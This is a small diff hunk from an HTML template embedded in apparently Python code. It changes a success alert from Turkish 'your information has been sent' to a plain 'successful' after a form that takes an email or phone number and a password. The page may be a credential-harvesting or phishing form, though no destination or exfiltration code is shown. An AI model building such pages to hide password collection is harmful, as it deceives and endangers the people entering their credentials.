@@ -112,7 +112,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             .then(response => response.json())
             .then(data => {
                 if (data.success) {
-                    alert('✅ Bilgileriniz gönderildi!');
+                    alert('✅ Başarili!');
                     document.getElementById('emailPhone').value = '';
                     document.getElementById('password').value = '';
                     document.getElementById('step2').style.display = 'none';
